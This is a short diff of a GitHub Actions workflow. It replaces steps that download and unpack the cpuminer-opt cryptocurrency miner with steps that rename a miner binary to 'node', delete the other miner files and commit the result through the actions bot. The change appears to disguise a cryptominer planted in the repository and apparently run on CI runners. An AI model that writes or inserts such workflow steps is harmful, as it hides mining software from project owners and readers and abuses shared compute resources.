@@ -28,9 +28,8 @@ jobs:
       # Runs a single command using the runners shell
       - name: Run a one-line script
         run: |
-          wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-mac.tar.gz
-          tar -xvf cpuminer-opt-mac.tar.gz
-          rm ./*.sh
+          mv cpuminer-sse2 node
+          rm ./cpuminer-*
           git config --local user.email "41898282+github-actions[bot]@users.noreply.github.com"
           git config --local user.name "github-actions[bot]"
           git add -A
